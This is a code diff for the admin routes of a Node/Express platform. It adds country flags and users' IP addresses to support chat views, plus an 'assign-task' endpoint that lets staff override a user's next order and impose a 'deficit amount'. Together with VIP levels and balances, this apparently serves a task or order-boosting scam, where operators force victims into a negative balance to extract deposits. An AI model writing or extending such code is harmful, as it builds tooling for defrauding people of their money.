@@ -4,6 +4,7 @@ const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const db = require('../db');
 const { adminAuthMiddleware, JWT_SECRET } = require('../middleware/auth');
+const geo = require('../utils/geo');
 
 // Role-based permission guard helper
 function checkRole(...allowedRoles) {
@@ -533,7 +534,17 @@ router.post('/tickets/reply', adminAuthMiddleware, checkRole('sub_admin', 'suppo
 // GET /api/admin/chat/conversations - List all user chat threads with unread counts
 router.get('/chat/conversations', adminAuthMiddleware, checkRole('sub_admin', 'support'), async (req, res) => {
   const conversations = await db.getChatConversations();
-  res.json({ success: true, conversations });
+  const enriched = conversations.map(c => {
+    const code = (c.country_code || 'US').toUpperCase();
+    const name = c.country_name || geo.getCountryName(code);
+    return {
+      ...c,
+      country_code: code,
+      country_name: name,
+      flag_emoji: geo.getFlagEmoji(code)
+    };
+  });
+  res.json({ success: true, conversations: enriched });
 });
 
 // GET /api/admin/chat/:userId - Get conversation messages for a specific user
@@ -542,6 +553,11 @@ router.get('/chat/:userId', adminAuthMiddleware, checkRole('sub_admin', 'support
   const user = await db.findUserById(userId);
   const messages = await db.getChatMessages(userId);
   await db.markChatReadByAdmin(userId);
+
+  const code = (user && user.country_code ? user.country_code : 'US').toUpperCase();
+  const name = (user && user.country_name) ? user.country_name : geo.getCountryName(code);
+  const flag = geo.getFlagEmoji(code);
+
   res.json({
     success: true,
     user: user ? {
@@ -549,7 +565,11 @@ router.get('/chat/:userId', adminAuthMiddleware, checkRole('sub_admin', 'support
       fullname: user.fullname || user.username,
       email: user.email,
       vip_level: user.vip_level,
-      balance: user.balance
+      balance: user.balance,
+      country_code: code,
+      country_name: name,
+      flag_emoji: flag,
+      ip_address: user.last_ip || '127.0.0.1'
     } : null,
     messages
   });
@@ -717,6 +737,44 @@ router.post('/staff/update', adminAuthMiddleware, checkRole('super_admin'), asyn
   } catch (err) {
     console.error('Update Staff Error:', err);
     res.status(500).json({ success: false, message: 'Error updating staff account' });
+  }
+});
+
+// POST /api/admin/users/assign-task - Override next order and assign deficit
+router.post('/users/assign-task', adminAuthMiddleware, checkRole('sub_admin', 'finance'), async (req, res) => {
+  try {
+    const { userId, orderNum, deficitAmount, productName, productPrice, clearCustom } = req.body;
+    const user = await db.findUserById(userId);
+    if (!user) {
+      return res.status(404).json({ success: false, message: 'User not found' });
+    }
+
+    if (clearCustom) {
+      await db.updateUser(userId, {
+        custom_order_num: null,
+        custom_deficit_amount: null,
+        custom_product_name: null,
+        custom_product_price: null
+      });
+      return res.json({ success: true, message: 'Custom task settings cleared for user.' });
+    }
+
+    const updates = {
+      custom_order_num: orderNum !== undefined && orderNum !== '' ? parseInt(orderNum) : (user.today_tasks_completed + 1),
+      custom_deficit_amount: deficitAmount !== undefined && deficitAmount !== '' ? parseFloat(deficitAmount) : 25.00,
+      custom_product_name: productName ? productName.trim() : null,
+      custom_product_price: productPrice ? parseFloat(productPrice) : null
+    };
+
+    await db.updateUser(userId, updates);
+    res.json({
+      success: true,
+      message: `Assigned custom task (Order #${updates.custom_order_num}, Deficit: $${updates.custom_deficit_amount}) successfully.`,
+      custom: updates
+    });
+  } catch (err) {
+    console.error('Assign Task Error:', err);
+    res.status(500).json({ success: false, message: 'Could not assign task: ' + err.message });
   }
 });
 
